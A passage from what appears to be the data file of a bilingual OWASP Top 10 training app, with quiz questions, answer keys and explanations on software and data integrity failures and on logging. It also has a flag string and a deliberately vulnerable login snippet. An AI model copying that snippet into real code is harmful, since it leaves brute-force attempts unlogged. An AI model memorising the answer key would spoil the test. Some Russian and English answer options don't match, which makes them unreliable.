        q: M('Что из перечисленного описывает риск «unsigned/unverified container image» в production Kubernetes-кластере?', 'Which of the following describes the risk of "unsigned/unverified container images" in a production Kubernetes cluster?'),
        opts: [
          M('Без верификации подписи образа кластер может развернуть подменённый/скомпрометированный образ, даже если он взят из «правильного» по названию репозитория', 'Without signature verification, the cluster can deploy a swapped/compromised image, even one pulled from a repo that appears "correct" by name'),
          M('Контейнеры невозможно подменить технически', 'Container images can\'t technically be swapped'),
          M('Относится только к публичным registry', 'It only applies to public registries'),
          M('Не является риском при использовании приватного registry', 'It\'s not a risk when using a private registry'),
        ],
        ans: 0,
        e: M('Без проверки подписи образа Kubernetes может задеплоить подменённый образ даже из репозитория «с правильным именем».', 'Without image signature verification, Kubernetes can deploy a swapped image even from a repository that looks correctly named.'),
      },
      {
        q: M('Почему insecure deserialization особенно опасна в комбинации с широко используемыми enterprise Java-фреймворками?', 'Why is insecure deserialization especially dangerous when combined with widely used enterprise Java frameworks?'),
        opts: [
          M('Java не поддерживает сериализацию', 'Java doesn\'t support serialization'),
          M('Обилие широко распространённых библиотек в classpath enterprise-приложений увеличивает вероятность найти пригодную для gadget chain комбинацию классов', 'The abundance of widely distributed libraries in an enterprise app\'s classpath increases the odds of finding a usable gadget-chain class combination'),
          M('Enterprise-приложения никогда не используют сериализацию', 'Enterprise apps never use serialization'),
          M('Java медленнее других языков', 'Java is slower than other languages'),
        ],
        ans: 1,
        e: M('В enterprise Java classpath полно библиотек, из которых легче собрать рабочую gadget chain для десериализации.', 'Enterprise Java classpaths are rich with libraries, raising the odds of finding a usable deserialization gadget chain.'),
      },
      {
        q: M('Что из перечисленного — правильная тестовая методология поиска insecure deserialization на пентесте?', 'What\'s the correct testing methodology for finding insecure deserialization in a pentest?'),
        opts: [
          M('Только фаззинг форм ввода текстом', 'Only fuzzing text input forms'),
          M('Проверка только заголовков ответа', 'Only checking response headers'),
          M('Идентификация точек, принимающих сериализованные данные (по формату — Java magic bytes, PHP O:, Python pickle opcode), затем тестирование через инструменты типа ysoserial/phpggc с последующим мониторингом на выполнение кода (например, через OOB DNS callback)', 'Identifying endpoints accepting serialized data (by format — Java magic bytes, PHP\'s O:, Python\'s pickle opcode), then testing with tools like ysoserial/phpggc while monitoring for code execution (e.g., via an OOB DNS callback)'),
          M('Проверка TLS-сертификата', 'Checking the TLS certificate'),
        ],
        ans: 2,
        e: M('На пентесте ищут эндпоинты с сериализованными данными (magic bytes, PHP O:, pickle), гоняют ysoserial/phpggc и ловят RCE через OOB (DNS).', 'Pentests find serialized-data endpoints (magic bytes, PHP O:, pickle), probe with ysoserial/phpggc, and detect RCE via OOB (e.g. DNS).'),
      },
      {
        q: M('Почему организациям стоит избегать десериализации объектов из данных, полученных напрямую от клиента, даже если клиент — «доверенное» мобильное приложение той же организации?', 'Why should organizations avoid deserializing objects from data sent directly by the client, even if the client is a "trusted" mobile app built by the same organization?'),
        opts: [
          M('Не является риском', 'It isn\'t a risk'),
          M('Мобильные приложения не могут быть скомпрометированы', 'Mobile apps can\'t be compromised'),
          M('Мобильные приложения не поддерживают сериализацию', 'Mobile apps don\'t support serialization'),
          M('Клиентское приложение может быть декомпилировано/модифицировано атакующим (например, через reverse engineering + перехват трафика), поэтому клиент — недоверенный источник по умолчанию', 'A client app can be decompiled/modified by an attacker (e.g., via reverse engineering + traffic interception), so a client should be treated as an untrusted source by default'),
        ],
        ans: 3,
        e: M('Клиентское приложение можно reverse-engineer’ить и подменить трафик, поэтому данные «от своего мобильного приложения» всё равно недоверенные.', 'Client apps can be reverse-engineered and traffic rewritten, so even “our mobile app” is an untrusted source by default.'),
      },
      {
        q: M('Что из перечисленного — верное про JSON как формат обмена данными в контексте A08?', 'Which of the following is true about JSON as a data-exchange format in the A08 context?'),
        opts: [
          M('JSON сам по себе не содержит исполняемого кода (в отличие от объектной сериализации), что снижает (но не устраняет полностью, при неправильном парсинге) риск integrity failure при его использовании вместо бинарной сериализации', 'JSON itself contains no executable code (unlike object serialization), reducing (though not eliminating, given parser misconfiguration) integrity-failure risk compared to binary serialization'),
          M('JSON не может использоваться для передачи структурированных данных', 'JSON can\'t be used to transmit structured data'),
          M('JSON изначально исполняемый формат, как pickle', 'JSON is inherently executable, like pickle'),
          M('JSON всегда небезопасен', 'JSON is always unsafe'),
        ],
        ans: 0,
        e: M('JSON сам по себе не исполняет код, в отличие от object-сериализации, и снижает (но не обнуляет при плохом парсере) риск integrity failure.', 'JSON itself carries no executable code unlike object serializers, reducing integrity risk—though misconfigured parsers can still hurt.'),
      },
      {
        q: M('Manifest confusion/dependency confusion атака (внутренний пакет с тем же именем, что публичный, но публичный имеет более высокую версию) относится к пересечению:', 'Manifest confusion/dependency confusion (an internal package sharing a name with a public one, but the public one has a higher version) relates to the overlap between:'),
        opts: [
          M('исключительно XSS', 'exclusively CSRF'),
          M('A08 и A03 — компрометация целостности источника зависимости', 'A08 and A03 — compromising the integrity of a dependency\'s source'),
          M('Не относится к данному классу уязвимостей', 'Does not belong to this vulnerability class'),
          M('исключительно CSRF', 'exclusively DoS'),
        ],
        ans: 1,
        e: M('Dependency/manifest confusion компрометирует источник зависимости: это пересечение supply chain (A03) и integrity артефакта (A08).', 'Dependency/manifest confusion compromises the dependency source—overlapping supply chain (A03) and artifact integrity (A08).'),
      },
      {
        q: M('Почему верификация цифровой подписи должна выполняться ДО распаковки/использования содержимого архива/пакета, а не после?', 'Why should digital-signature verification happen BEFORE unpacking/using an archive/package\'s contents, rather than after?'),
        opts: [
          M('Порядок не имеет значения', 'Order doesn\'t matter'),
          M('Требуется только для ZIP-архивов', 'Only relevant for ZIP archives'),
          M('Обработка непроверенного содержимого до верификации подписи может само по себе привести к эксплуатации уязвимости парсера, даже если сама подпись впоследствии окажется неверной', 'Processing unverified content before verifying the signature can itself trigger a parser-level exploit, even if the signature is later found invalid'),
          M('Верификация после быстрее', 'Verifying afterward is faster'),
        ],
        ans: 2,
        e: M('Подпись нужно проверять до распаковки: иначе уже парсинг вредоносного архива может эксплуатировать уязвимость, даже если подпись потом «не сойдётся».', 'Verify signatures before unpacking: processing untrusted content first can exploit parser bugs even if the signature later fails.'),
      },
      {
        q: M('Что из перечисленного — пример «software integrity failure» в мобильном приложении?', 'Which of the following is an example of a "software integrity failure" in a mobile app?'),
        opts: [
          M('Отсутствие MFA', 'Missing MFA'),
          M('Использование HTTP вместо HTTPS', 'Using HTTP instead of HTTPS'),
          M('Слабый пароль пользователя', 'A user\'s weak password'),
          M('Приложение не проверяет целостность собственного кода/ресурсов при запуске, позволяя выполнение модифицированной (patched) версии с обходом security-проверок', 'The app doesn\'t verify the integrity of its own code/resources at launch, allowing a modified (patched) version with security checks bypassed to run'),
        ],
        ans: 3,
        e: M('Mobile integrity failure — отсутствие проверки целостности своего кода/ресурсов, из-за чего запускается patched-сборка с обходом security-проверок.', 'A mobile integrity failure is not verifying own code/resources at launch, allowing patched builds that bypass security checks.'),
      },
      {
        q: M('Почему объектная десериализация опаснее, чем парсинг структурированного текстового формата с явной схемой (например, Protocol Buffers с строгой схемой)?', 'Why is object deserialization riskier than parsing a structured text format with an explicit schema (e.g., Protocol Buffers with a strict schema)?'),
        opts: [
          M('Объектная десериализация напрямую инстанцирует произвольные классы, обнаруженные в потоке данных, тогда как формат со строгой схемой ограничивает набор допустимых полей/типов заранее', 'Object deserialization directly instantiates arbitrary classes found in the data stream, whereas a strict-schema format constrains the set of allowed fields/types in advance'),
          M('Объектная сериализация быстрее, поэтому безопаснее', 'Object serialization is faster, hence safer'),
          M('Между ними нет разницы в безопасности', 'There\'s no difference in safety between them'),
          M('Protocol Buffers всегда медленнее', 'Protocol Buffers is always slower'),
        ],
        ans: 0,
        e: M('Object-десериализация инстанцирует произвольные классы из потока; schema-форматы (Protobuf и т.п.) заранее ограничивают поля и типы.', 'Object deserialization instantiates arbitrary classes from the stream; strict-schema formats (e.g. Protobuf) constrain allowed fields and types.'),
      },
      {
        q: M('Что из перечисленного описывает атаку «type confusion» через полиморфную десериализацию (например, Jackson с enableDefaultTyping)?', 'Which of the following describes a "type confusion" attack via polymorphic deserialization (e.g., Jackson with enableDefaultTyping)?'),
        opts: [
          M('Не является риском при использовании JSON', 'It\'s not a risk when using JSON'),
          M('Атакующий указывает произвольный класс для инстанцирования через поле типа в JSON, если библиотека сконфигурирована принимать тип из самих данных, а не из строгой схемы', 'The attacker specifies an arbitrary class to instantiate via a type field in the JSON, if the library is configured to take the type from the data itself rather than a strict schema'),
          M('Относится только к XML', 'It only applies to XML'),
          M('Требует физического доступа', 'It requires physical access'),
        ],
        ans: 1,
        e: M('Type confusion через polymorphic typing (Jackson enableDefaultTyping): тип берётся из данных, и атакующий подставляет произвольный класс.', 'Polymorphic type confusion (e.g. Jackson enableDefaultTyping) trusts a type field in the data, so attackers can instantiate arbitrary classes.'),
      },
      {
        q: M('Почему «trust but don\'t verify» — антипаттерн, релевантный категории A08?', 'Why is "trust but don\'t verify" an antipattern relevant to category A08?'),
        opts: [
          M('Verify всегда избыточен при использовании HTTPS', 'Verification is always redundant when HTTPS is used'),
          M('Не относится к A08', 'It\'s unrelated to A08'),
          M('Слепое доверие к источнику данных/кода без криптографической верификации целостности — суть корневой причины Integrity Failures', 'Blind trust in the source of data/code without cryptographic integrity verification is the essential root cause of Integrity Failures'),
          M('Это рекомендуемая практика', 'It\'s a recommended practice'),
        ],
        ans: 2,
        e: M('«Trust but don’t verify» — корневая причина Integrity Failures: доверие к источнику без криптографической проверки целостности.', '“Trust but don’t verify” is the root of Integrity Failures: trusting a source without cryptographic integrity checks.'),
      },
      {
        q: M('Что из перечисленного — верно про npm postinstall-скрипты в контексте integrity?', 'Which of the following is true about npm postinstall scripts in the integrity context?'),
        opts: [
          M('Postinstall-скрипты не могут исполнять произвольный код', 'Postinstall scripts can\'t execute arbitrary code'),
          M('Не относится ни к A03, ни к A08', 'It\'s unrelated to either A03 or A08'),
          M('Postinstall-скрипты требуют ручного подтверждения всегда по умолчанию', 'Postinstall scripts always require manual confirmation by default'),
          M('Postinstall-скрипты автоматически исполняются при установке пакета и могут содержать вредоносный код, если пакет/его зависимость скомпрометированы (пересечение с A03)', 'Postinstall scripts run automatically at package install time and can contain malicious code if the package/its dependency is compromised (overlapping with A03)'),
        ],
        ans: 3,
        e: M('npm postinstall выполняется автоматически при install и может запустить malware, если пакет скомпрометирован (пересечение с A03).', 'npm postinstall scripts run automatically on install and can execute malware if the package is compromised (overlaps A03).'),
      },
      {
        q: M('Почему хранение хешей эталонных версий файлов (integrity monitoring / FIM — File Integrity Monitoring) полезно для обнаружения нарушения целостности production-системы?', 'Why is keeping hashes of reference file versions (integrity monitoring / FIM — File Integrity Monitoring) useful for detecting integrity violations in production?'),
        opts: [
          M('Позволяет обнаружить несанкционированное изменение критичных файлов/бинарников постфактум, сравнивая текущий хеш с эталонным', 'It allows detecting unauthorized changes to critical files/binaries after the fact, by comparing the current hash to the reference one'),
          M('FIM замедляет систему без пользы', 'FIM slows the system down with no benefit'),
          M('FIM заменяет необходимость подписи артефактов', 'FIM replaces the need for artifact signing'),
          M('FIM относится только к сетевому трафику', 'FIM only applies to network traffic'),
        ],
        ans: 0,
        e: M('FIM сравнивает текущие хеши критичных файлов с эталоном и обнаруживает несанкционированные изменения в production.', 'File Integrity Monitoring compares live hashes of critical files to baselines to detect unauthorized production changes.'),
      },
      {
        q: M('Что из перечисленного — пример правильной защиты пайплайна релиза от «time-of-check to time-of-use» (TOCTOU) race condition при верификации подписи?', 'Which of the following is a correct example of protecting a release pipeline against a "time-of-check to time-of-use" (TOCTOU) race condition during signature verification?'),
        opts: [
          M('Проверка подписи артефакта задолго до его фактического использования/деплоя, с возможностью подмены файла между проверкой и использованием', 'Verifying the artifact\'s signature long before it\'s actually used/deployed, leaving room for the file to be swapped in between'),
          M('Проверка подписи непосредственно перед использованием артефакта, с последующим немедленным использованием того же самого проверенного объекта без промежуточной подмены', 'Verifying the signature immediately before use, followed instantly by using that exact same verified object with no intervening swap'),
          M('Не требует внимания', 'It requires no special attention'),
          M('TOCTOU не относится к integrity', 'TOCTOU is unrelated to integrity'),
        ],
        ans: 1,
        e: M('Против TOCTOU подпись проверяют непосредственно перед использованием того же объекта, без окна для подмены между check и use.', 'Against TOCTOU, verify the signature immediately before using that same object, with no swap window between check and use.'),
      },
      {
        q: M('Согласно принципам A08, зависимости и файлы должны приходить:', 'Per A08 principles, dependencies and files should come:'),
        opts: [
          M('без проверки происхождения, если используется VPN', 'with no origin check, as long as a VPN is used'),
          M('из любого удобного источника для скорости разработки', 'from any convenient source, for development speed'),
          M('из ожидаемых, доверенных репозиториев через verified/signed channel', 'from expected, trusted repositories over a verified/signed channel'),
          M('исключительно с локального диска разработчика', 'exclusively from the developer\'s local disk'),
        ],
        ans: 2,
        e: M('По A08 зависимости и файлы должны приходить из ожидаемых доверенных репозиториев по verified/signed каналу.', 'Per A08, dependencies and files should come from expected trusted repositories over verified/signed channels.'),
      },
      {
        q: M('Что из перечисленного описывает риск конкретно для десериализации через YAML (например, PyYAML yaml.load() без safe_load)?', 'Which of the following describes a risk specific to YAML deserialization (e.g., PyYAML\'s yaml.load() without safe_load)?'),
        opts: [
          M('YAML всегда безопасен', 'YAML is always safe'),
          M('YAML относится только к конфигурационным файлам, не к данным пользователя', 'YAML only applies to config files, not user data'),
          M('YAML не поддерживает объекты', 'YAML doesn\'t support objects'),
          M('Небезопасная загрузка YAML может позволить инстанцирование произвольных Python-объектов из тегов вида !!python/object, аналогично pickle', 'Unsafe YAML loading can allow instantiating arbitrary Python objects from tags like !!python/object, similar to pickle'),
        ],
        ans: 3,
        e: M('Небезопасный yaml.load() (без safe_load) может инстанцировать произвольные Python-объекты через теги !!python/object, аналогично pickle.', 'Unsafe yaml.load() without safe_load can instantiate arbitrary Python objects via !!python/object tags, similar to pickle.'),
      },
      {
        q: M('Почему auto-update механизм плагина браузера/расширения — частая цель атак на целостность?', 'Why is a browser plugin/extension\'s auto-update mechanism a frequent target for integrity attacks?'),
        opts: [
          M('Скомпрометированный канал обновления расширения позволяет незаметно для пользователя доставить вредоносный код с широким доступом к браузерным данным, минуя app store review при последующих «тихих» обновлениях', 'A compromised extension-update channel lets an attacker silently deliver malicious code with broad access to browser data, bypassing app-store review on subsequent "silent" updates'),
          M('Расширения не относятся к A08', 'It\'s unrelated to A08'),
          M('Расширения обновляются вручную всегда', 'Extensions are always updated manually'),
          M('Расширения не имеют доступа к данным пользователя', 'Extensions have no access to user data'),
        ],
        ans: 0,
        e: M('Скомпрометированный auto-update расширения доставляет malware «тихо», с широким доступом к браузеру и в обход app-store review на последующих обновлениях.', 'A compromised extension update channel silently delivers malware with broad browser access, bypassing store review on later updates.'),
      },
      {
        q: M('Что из перечисленного — верное про связь между Log4Shell (Log4j RCE) и категорией A08 vs A03?', 'Which of the following is true about the relationship between Log4Shell (Log4j RCE) and category A08 vs. A03?'),
        opts: [
          M('Log4Shell — исключительно проблема integrity, не supply chain', 'Log4Shell is exclusively an integrity problem, not supply chain'),
          M('Log4Shell — пример уязвимого компонента (A03, известная CVE в зависимости), при этом сама техника эксплуатации через JNDI lookup демонстрирует более широкую проблему небезопасной десериализации/интерпретации недоверенных данных (пересечение с A05/A08)', 'Log4Shell is an example of a vulnerable component (A03, a known CVE in a dependency), while the exploitation technique itself — via JNDI lookup — demonstrates the broader issue of unsafe deserialization/interpretation of untrusted data (overlapping with A05/A08)'),
          M('Log4Shell относится только к A01', 'Log4Shell relates only to A01'),
          M('Log4Shell не связан ни с одной из категорий', 'Log4Shell is unrelated to either category'),
        ],
        ans: 1,
        e: M('Log4Shell — уязвимый компонент (A03), а техника через JNDI/интерпретацию недоверенных данных пересекается с injection/integrity (A05/A08).', 'Log4Shell is a vulnerable dependency (A03); JNDI-based abuse of untrusted data also overlaps injection/integrity themes (A05/A08).'),
      },
      {
        q: M('Почему «code signing certificate», используемый для подписи ПО, сам требует строгой защиты (в HSM, с ограниченным доступом)?', 'Why does the code-signing certificate used to sign software itself require strict protection (in an HSM, with restricted access)?'),
        opts: [
          M('Требуется только для open-source ПО', 'Only required for open-source software'),
          M('Сертификаты подписи невозможно украсть', 'Signing certificates can\'t be stolen'),
          M('Компрометация приватного ключа подписи позволяет атакующему подписать вредоносный код как легитимный, полностью обходя механизм верификации целостности', 'Compromising the private signing key lets an attacker sign malicious code as legitimate, completely bypassing the integrity-verification mechanism'),
          M('Не имеет значения, где хранится', 'It doesn\'t matter where it\'s stored'),
        ],
        ans: 2,
        e: M('Утечка private code-signing key позволяет подписать malware как легитимное ПО и полностью обойти проверку подписи.', 'Compromise of the private code-signing key lets attackers sign malware as legitimate software and fully bypass signature checks.'),
      },
      {
        q: M('Что из перечисленного — риск «CI/CD platform trust boundary violation»?', 'Which of the following describes a "CI/CD platform trust boundary violation" risk?'),
        opts: [
          M('Относится только к self-hosted раннерам', 'It only applies to self-hosted runners'),
          M('Не связано с integrity', 'It\'s unrelated to integrity'),
          M('Не является риском при использовании облачного CI', 'It\'s not a risk when using a cloud CI'),
          M('CI-раннер, используемый для сборки нескольких проектов разных команд без изоляции, позволяет потенциально скомпрометированной сборке одного проекта повлиять на артефакты другого через общее состояние раннера', 'A CI runner used to build several projects from different teams without isolation, letting a potentially compromised build of one project affect another\'s artifacts through shared runner state'),
        ],
        ans: 3,
        e: M('Общий CI-runner без изоляции между командами — нарушение trust boundary: одна скомпрометированная сборка может отравить артефакты другой.', 'A shared CI runner without isolation is a trust-boundary violation: one compromised build can poison another project’s artifacts.'),
      },
      {
        q: M('Почему верификация checksum (например, SHA-256) файла, скачанного с открытого зеркала, недостаточна сама по себе для полной гарантии целостности (в отличие от криптографической подписи)?', 'Why is verifying a checksum (e.g., SHA-256) of a file downloaded from a public mirror insufficient on its own for full integrity assurance (unlike a cryptographic signature)?'),
        opts: [
          M('Checksum без подписи можно пересчитать и опубликовать заново для подменённого файла тем же злоумышленником, который скомпрометировал источник — подпись требует обладания приватным ключом издателя, которого у атакующего нет', 'A checksum without a signature can be recalculated and republished for a tampered file by the very same attacker who compromised the source — a signature requires possession of the publisher\'s private key, which the attacker doesn\'t have'),
          M('Checksum всегда надёжнее подписи', 'A checksum is always more reliable than a signature'),
          M('Checksum и подпись эквивалентны по гарантии', 'A checksum and a signature offer equivalent assurance'),
          M('Checksum не имеет отношения к integrity', 'A checksum is unrelated to integrity'),
        ],
        ans: 0,
        e: M('Один checksum без подписи атакующий может пересчитать для подменённого файла; подпись требует приватного ключа издателя.', 'An unsigned checksum can be recomputed for a tampered file by the same attacker; a signature needs the publisher’s private key.'),
      },
      {
        q: M('Что из перечисленного описывает «insecure CI/CD trigger» уязвимость (например, workflow, триггерящийся на pull_request_target с доступом к секретам)?', 'Which of the following describes an "insecure CI/CD trigger" vulnerability (e.g., a workflow triggered on pull_request_target with access to secrets)?'),
        opts: [
          M('Не является уязвимостью', 'It isn\'t a vulnerability'),
          M('Позволяет внешнему контрибьютору через специально оформленный PR получить доступ к секретам/выполнить код в контексте с повышенными правами через CI, нарушая integrity пайплайна', 'It allows an external contributor, via a specially crafted PR, to gain access to secrets/execute code in an elevated context via CI, violating the pipeline\'s integrity'),
          M('Требует физического доступа к серверу CI', 'It requires physical access to the CI server'),
          M('Относится только к приватным репозиториям', 'It only applies to private repositories'),
        ],
        ans: 1,
        e: M('Небезопасный trigger вроде pull_request_target с секретами даёт внешнему PR выполнение кода и доступ к secrets, нарушая integrity пайплайна.', 'An insecure trigger such as pull_request_target with secrets lets an external PR run code and steal secrets, breaking pipeline integrity.'),
      },
      {
        q: M('Согласно рекомендациям A08, безопаснее ли использовать формат данных с явной, ограниченной схемой (JSON Schema, Protobuf) вместо языко-специфичной бинарной сериализации для межсервисного взаимодействия?', 'Per A08 recommendations, is it safer to use a data format with an explicit, constrained schema (JSON Schema, Protobuf) instead of language-specific binary serialization for inter-service communication?'),
        opts: [
          M('Бинарная сериализация всегда безопаснее', 'Binary serialization is always safer'),
          M('Формат не имеет значения для integrity', 'The format doesn\'t matter for integrity'),
          M('Да — схема ограничивает набор допустимых полей/типов, снижая поверхность атаки по сравнению с произвольной инстанциацией объектов', 'Yes — a schema constrains the set of allowed fields/types, reducing the attack surface compared to arbitrary object instantiation'),
          M('Нет разницы', 'No difference'),
        ],
        ans: 2,
        e: M('Форматы со схемой (JSON Schema, Protobuf) ограничивают типы и поля и безопаснее языко-специфичной бинарной сериализации между сервисами.', 'Schema-constrained formats (JSON Schema, Protobuf) limit fields/types and are safer than language-specific binary serialization between services.'),
      },
      {
        q: M('Что из перечисленного — правильная мера при обнаружении, что production использует .NET BinaryFormatter для десериализации данных, полученных от внешнего клиента?', 'Which of the following is the correct response upon discovering that production uses .NET BinaryFormatter to deserialize data received from an external client?'),
        opts: [
          M('Увеличить логирование без изменения кода', 'Increase logging without changing the code'),
          M('Отключить только логирование ошибок', 'Disable only error logging'),
          M('Оставить как есть, если инцидентов пока не было', 'Leave it as is if there haven\'t been incidents yet'),
          M('Приоритетно мигрировать на безопасную альтернативу (например, System.Text.Json с строгой схемой) и/или изолировать процесс десериализации', 'Prioritize migrating to a safe alternative (e.g., System.Text.Json with a strict schema) and/or isolating the deserialization process'),
        ],
        ans: 3,
        e: M('BinaryFormatter на данных внешнего клиента нужно срочно заменить (например System.Text.Json + schema) и/или изолировать процесс десериализации.', 'BinaryFormatter on external client data should be migrated urgently (e.g. System.Text.Json with a strict schema) and/or sandboxed.'),
      },
      {
        q: M('Почему «pull-based» обновление конфигурации (агент сам запрашивает и верифицирует подпись новой конфигурации с сервера) считается более безопасным паттерном, чем «push-based» без верификации?', 'Why is a "pull-based" configuration update pattern (an agent itself requests and verifies the signature of a new config from the server) considered safer than an unverified "push-based" pattern?'),
        opts: [
          M('Pull-паттерн с верификацией подписи на стороне агента даёт возможность агенту самому отклонить неподписанную/подменённую конфигурацию, тогда как безusловный push полагается только на защиту канала передачи', 'A pull-based pattern with signature verification on the agent side lets the agent itself reject an unsigned/tampered configuration, whereas an unconditional push relies solely on transport-channel protection'),
          M('Push всегда безопаснее', 'Push is always safer'),
          M('Push и pull эквивалентны по безопасности всегда', 'Push and pull are always equally secure'),
          M('Не связано с integrity', 'It\'s unrelated to integrity'),
        ],
        ans: 0,
        e: M('Pull-update с проверкой подписи на агенте позволяет отклонить неподписанную конфигурацию; «голый» push опирается только на защиту канала.', 'Pull-based signed config lets the agent reject unsigned/tampered updates; unverified push relies only on transport protection.'),
      },
      {
        q: M('Что из перечисленного — пример нарушения целостности данных (Data Integrity Failure, не Software) в контексте A08?', 'Which of the following is an example of a Data Integrity Failure (as opposed to a Software Integrity Failure) in the A08 context?'),
        opts: [
          M('Слабый пароль пользователя', 'A user\'s weak password'),
          M('Отсутствие проверки контрольной суммы/подписи критичных бизнес-данных (например, финансовой транзакции), передаваемых между микросервисами, позволяющее их незаметную подмену «в полёте» между доверяющими друг другу сервисами', 'Missing checksum/signature verification for critical business data (e.g., a financial transaction) exchanged between microservices, allowing it to be silently tampered with "in flight" between mutually trusting services'),
          M('Отсутствие CSP', 'Missing CSP'),
          M('RCE через десериализацию', 'RCE via deserialization'),
        ],
        ans: 1,
        e: M('Data Integrity Failure — отсутствие подписи/checksum критичных бизнес-данных (например транзакций) между сервисами, что позволяет незаметную подмену «в полёте».', 'A Data Integrity Failure is missing checksum/signature on critical business data (e.g. transactions) between services, enabling silent in-flight tampering.'),
      },
      {
        q: M('Почему организациям рекомендуется вести аудируемый лог всех изменений в CI/CD конфигурации (кто, когда, что изменил)?', 'Why is it recommended to maintain an auditable log of all changes to CI/CD configuration (who, when, what was changed)?'),
        opts: [
          M('Замедляет работу CI без пользы', 'It slows down CI with no benefit'),
          M('Требуется только для соответствия ISO', 'Only required for ISO compliance'),
          M('Позволяет расследовать инциденты нарушения целостности пайплайна постфактум и обнаружить несанкционированные изменения, что также пересекается с A09 (Logging)', 'It enables investigating pipeline-integrity-violation incidents after the fact and detecting unauthorized changes, which also overlaps with A09 (Logging)'),
          M('Не имеет значения для integrity', 'It doesn\'t matter for integrity'),
        ],
        ans: 2,
        e: M('Аудит изменений CI/CD (кто/когда/что) помогает расследовать integrity-инциденты и пересекается с A09 Logging.', 'Auditable CI/CD config change logs support investigating integrity incidents and overlap with A09 Logging failures.'),
      },
      {
        q: M('Какая мера НАИБОЛЕЕ комплексно снижает риск категории A08 (Software/Data Integrity Failures) в организации?', 'Which measure MOST comprehensively reduces an organization\'s risk from category A08 (Software/Data Integrity Failures)?'),
        opts: [
          M('Отключение HTTPS для ускорения сборки', 'Disabling HTTPS to speed up builds'),
          M('Только антивирус на серверах', 'Only antivirus on servers'),
          M('Увеличение частоты релизов', 'Increasing release frequency'),
          M('Обязательная криптографическая подпись всех артефактов/обновлений + верификация подписи перед использованием + отказ от небезопасной объектной десериализации недоверенных данных в пользу схемо-ограниченных форматов + code review перед мержем', 'Mandatory cryptographic signing of all artifacts/updates + signature verification before use + avoiding unsafe object deserialization of untrusted data in favor of schema-constrained formats + code review before merge'),
        ],
        ans: 3,
        e: M('Комплекс против A08: подпись всех артефактов, verify перед use, отказ от unsafe object-десериализации в пользу schema-форматов и code review.', 'The strongest A08 control set is mandatory artifact signing, verify-before-use, no unsafe object deserialization (prefer schemas), and pre-merge code review.'),
      },
    ],
  },
  {
    code: 'A09', name: 'Logging & Monitoring Failures', nameRu: 'Сбои журналирования',
    risk: 'MEDIUM', owasp2021: 'A09', owasp2025: 'A09',
    cwe: ['CWE-778', 'CWE-223', 'CWE-532'],
    flag: 'FLAG{detected_bruteforce_from_logs}',
    blurb: M('Нет журнала аудита, атаки долго остаются незамеченными, а секреты попадают в логи.', 'No audit trail, long MTTD, secrets in logs.'),
    theory: M(
`<p>Без логов атака невидима. IBM: среднее время обнаружения ~200+ дней.</p>
<div class="ebox">// Хорошо
WARN [auth] FAIL user=admin ip=185.220.x.x attempt=47

// Плохо
DEBUG [auth] login password=s3cr3t!   ← никогда</div>
<p>Логировать: login success/fail, privilege changes, data access. SIEM: correlation, MTTD/MTTR.</p>`,
`<p>Without logs, attacks stay invisible. Industry MTTD is often 200+ days.</p>
<div class="ebox">// Good
WARN [auth] FAIL user=admin ip=185.220.x.x attempt=47

// Bad
DEBUG [auth] login password=s3cr3t!   ← never</div>
<p>Log: login success/fail, privilege changes, data access. SIEM: correlation, MTTD/MTTR.</p>`
    ),
    vulnCode: `// No failed login logging
if (!checkPassword(u, p)) return 401;
// attacker brute-forces silently`,
    fixCode: `if (!checkPassword(u, p)) {
  audit.warn('AUTH_FAIL', { user: u, ip, ua });
  if (fails(ip) > 10) alertSOC('brute-force', ip);
  return 401;
}`,
    quiz: [
      {
        q: M('Как называлась категория A09 в редакции 2021 года?', 'What was category A09 called in the 2021 edition?'),
        opts: [
          M('Security Logging and Monitoring Failures', 'Security Logging and Monitoring Failures'),
          M('Using Components with Known Vulnerabilities', 'Using Components with Known Vulnerabilities'),
          M('Broken Authentication', 'Broken Authentication'),
          M('Sensitive Data Exposure', 'Sensitive Data Exposure'),
        ],
        ans: 0,
        e: M('В OWASP Top 10:2021 категория A09 называлась Security Logging and Monitoring Failures; в 2025 её переименовали, сместив акцент с monitoring на alerting.', 'In OWASP Top 10:2021 category A09 was named Security Logging and Monitoring Failures; the 2025 edition renamed it to stress alerting rather than monitoring alone.'),
      },
      {
        q: M('Почему в 2025 акцент сместился с «monitoring» на «alerting»?', 'Why did the emphasis shift from "monitoring" to "alerting" in 2025?'),
        opts: [
          M('Alerting — устаревший термин', '"Alerting" is an outdated term'),
          M('Логирование и мониторинг без реального срабатывания уведомления/реакции (alerting) бесполезны для своевременного обнаружения инцидента', 'Logging and monitoring without an actual notification/response (alerting) trigger are useless for timely incident detection'),
          M('Monitoring больше не нужен', 'Monitoring is no longer needed'),
          M('Разницы между терминами нет', 'There\'s no difference between the terms'),
        ],
        ans: 1,
        e: M('Логи и пассивный мониторинг сами по себе не останавливают атаку: без срабатывания уведомления и реакции (alerting) инцидент обнаруживается слишком поздно. Поэтому в 2025 акцент перенесён на alerting.', 'Logs and passive monitoring alone do not stop attacks: without a notification and response trigger (alerting), incidents are found too late. That is why 2025 emphasizes alerting.'),
      },
      {
        q: M('Почему категория A09 недопредставлена в автоматизированных тестовых данных OWASP (попадает в топ через community survey)?', 'Why is category A09 underrepresented in OWASP\'s automated test data (it ranks highly mainly via the community survey)?'),
        opts: [
          M('Логирование не относится к безопасности', 'Logging is unrelated to security'),
          M('OWASP не собирает данные по этой категории вообще', 'OWASP doesn\'t collect any data for this category at all'),
          M('Сложно автоматически протестировать «отсутствие лога» сканером — это требует понимания архитектуры/процессов организации', 'It\'s hard to automatically test for "absence of a log" with a scanner — it requires understanding an organization\'s architecture/processes'),
          M('Категория не существует технически', 'The category doesn\'t technically exist'),
        ],
        ans: 2,
        e: M('Сканеры плохо доказывают «отсутствие лога» или неработающий алерт — нужны знание архитектуры и процессов. Поэтому A09 попадает в Top 10 в основном через community survey, а не только через авто-статистику.', 'Scanners struggle to prove a missing log or a dead alert path — that needs architectural and process context. A09 therefore ranks via the community survey more than pure automated test data.'),
      },
      {
        q: M('Какие события ОБЯЗАТЕЛЬНО должны логироваться согласно OWASP-рекомендациям A09?', 'Which events MUST be logged per OWASP\'s A09 guidance?'),
        opts: [
          M('Ничего, если используется HTTPS', 'Nothing, if HTTPS is used'),
          M('Только успешные логины', 'Only successful logins'),
          M('Только ошибки 500', 'Only 500 errors'),
          M('Логины (успешные и неудачные), отказы авторизации, серверные ошибки высокой значимости, ввод явно вредоносных payload\'ов', 'Logins (successful and failed), authorization denials, high-severity server errors, and inputs that are clearly malicious payloads'),
        ],
        ans: 3,
